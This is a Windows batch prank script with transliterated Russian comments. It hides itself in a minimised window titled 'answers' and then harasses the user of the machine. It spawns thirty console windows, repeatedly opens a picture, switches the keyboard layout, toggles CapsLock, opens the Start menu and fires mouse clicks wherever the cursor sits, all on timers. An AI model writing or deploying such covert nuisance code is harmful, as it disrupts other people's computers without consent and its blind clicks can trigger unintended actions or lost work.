@echo off
rem Perezapusk sebya v svernutom okne. Zakryt eto okno na paneli zadach = ostanovit prikol.
if not "%~1"=="run" (
  start "otvety" /min "%~f0" run
  exit /b
)

rem --- startovyj zalp: kucha okon cmd na ves ekran, cherez 3 sek sami zakroyutsya ---
for /l %%i in (1,1,30) do start "" cmd /c "timeout /t 3 >nul"

rem --- srazu vyletaet kartinka (zakryvaetsya krestikom) ---
if exist "%~dp0foto.jpg" start "" "%~dp0foto.jpg"

set m=0

:loop
timeout /t 60 /nobreak >nul
set /a m+=1

rem --- kazhduyu minutu: smena yazyka (Alt+Shift) ---
powershell -NoProfile -Command "$s=New-Object -ComObject WScript.Shell; $s.SendKeys('%%+')"

rem --- kazhdye 2 minuty: klik levoj knopkoj myshi tam, gde stoit kursor ---
set /a r=m %% 2
if %r%==0 powershell -NoProfile -Command "Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int a,int b,int c,int d,int e);' -Name M -Namespace W; [W.M]::mouse_event(2,0,0,0,0); [W.M]::mouse_event(4,0,0,0,0)"

rem --- kazhdye 3 minuty: CapsLock, menyu Pusk i okno komandnoj stroki ---
set /a r=m %% 3
if %r%==0 (
  powershell -NoProfile -Command "$s=New-Object -ComObject WScript.Shell; $s.SendKeys('{CAPSLOCK}'); Start-Sleep 1; $s.SendKeys('^{ESC}'); Start-Sleep 2; $s.SendKeys('{ESC}')"
  start "" cmd /k ver
)

rem --- kazhdye 4 minuty: snova vyletaet kartinka ---
set /a r=m %% 4
if %r%==0 if exist "%~dp0foto.jpg" start "" "%~dp0foto.jpg"

goto loop
